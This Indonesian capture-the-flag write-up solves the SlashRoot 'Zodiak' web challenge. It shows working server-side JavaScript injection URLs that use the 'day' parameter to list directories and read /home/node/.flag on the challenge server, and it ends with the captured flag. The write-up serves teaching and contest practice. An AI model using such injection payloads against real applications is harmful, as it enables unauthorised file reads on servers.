@@ -1,0 +1,78 @@
+
+~ Zodiak ~ Web ~ SlashRoot (250pts)
+
+Kali ini soal web hacking yang berjudul zodiak : http://103.200.7.150:9087/
+
+FYI tim kami telah mendapatkan flagnya setelah waktu challenge berakhir 
+jadi kami tidak sempat submit dan mendapatkan poin tapi kami akan menjelaskan
+bagaimana mendapatkan flagnya.
+
+di webnya ada sebuah form dimana kita bisa mengisi nama, tanggal lahir dll
+jika disubmit akan mencul ramalan2 yg ga guna. Tapi disini kita bukan
+mencari ramalan2 itu kita harus mendapatkan flagnya. setelah dibongkar sourcenya
+saya menemukan skrip javascrip berikut ini :
+
+$('#cek').click(function(){
+    var data_table = "";
+    var split_date = $('#date').val().split(/\//);
+    var name = $('#name').val();
+    $data = {
+    day: split_date[0],
+    month: split_date[1],
+    year: split_date[2],
+    name: name
+    };
+    $.ajax({
+    type: "GET",
+    url: "/ramal/",
+    dataType: "json",
+    data: $data
+
+
+Skrip ini berfungsi mengirim dan menerima data ke server pada url : http://103.200.7.150:9087/ramal
+Contoh : http://103.200.7.150:9087/ramal?name=sj&year=%202001&month=7&day=3
+Akan menghasilkan data json :
+{"day":3,"month":7,"zodiak":"Cancer","ramalan":"Hay sj ( 16 tahun ). Jangan takabur dulu walaupun 
+kesehatan dirasa cukup baik untuk saat ini karena jika tidak ada upaya untuk menjaganya maka tidak 
+lama akan jatuh sakit juga."}
+
+Pertama saya menambahkan ' di variabel day, berharap mendapatkan error sqli
+http://103.200.7.150:9087/ramal?name=sj&year=%202001&month=7&day=3%27
+Hasilnya:
+------------------------------------------------------------------------------------------------------
+SyntaxError: Invalid or unexpected token
+    at /usr/src/app/app.js:15:29
+    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
+    at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13)
+    at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3)
+    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
+    at /usr/src/app/node_modules/express/lib/router/index.js:281:22
+    at Function.process_params (/usr/src/app/node_modules/express/lib/router/index.js:335:12)
+    at next (/usr/src/app/node_modules/express/lib/router/index.js:275:10)
+    at urlencodedParser (/node_modules/body-parser/lib/types/urlencoded.js:91:7)
+    at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5)
+-------------------------------------------------------------------------------------------------------
+
+Ternyata ini bukan error sqli, ini adalah error dari aplikasi nodejs. server menggunakan nodejs
+sebagai backendnya.
+Setelah saya searching digoogle cara menginjeknya akhirnya saya bisa mencoba membaca dir nya dengan
+menambahkan kode javascript di setelah variable datenya, menjadi:
+
+http://103.200.7.150:9087/ramal?name=sj&year=%202001&month=7&day=3;res.end(require(%27fs%27).readdirSync(%27/%27).toString())
+
+Dan output yang dihasilkan web adalah : 
+.dockerenv,bin,boot,dev,etc,home,lib,lib64,media,mnt,node_modules,opt,proc,root,run,sbin,srv,sys,tmp,usr,var
+
+Wow kita baru saja melihat isi dari root direktori, setelah mengobok2 dirnya saya menemukan tempat flag berada :
+http://103.200.7.150:9087/ramal?name=sj&year=%202001&month=7&day=3;;res.end(require(%27fs%27).readdirSync(%27/home/node%27).toString())
+
+Hasil outputnya : 
+.bash_logout,.bashrc,.flag,.profile
+
+Tuhkan keliatan flagnya :v, mari kita baca isi dari file .flag dengan readFileSync :
+http://103.200.7.150:9087/ramal?name=sj&year=%202001&month=7&day=3;;res.end(require(%27fs%27).readFileSync(%27/home/node/.flag%27).toString())
+
+dan output yang dihasilkan web adalah : 
+SlashRootCTF{horoscope_is_bullsheep}
+
+Flag : SlashRootCTF{horoscope_is_bullsheep}
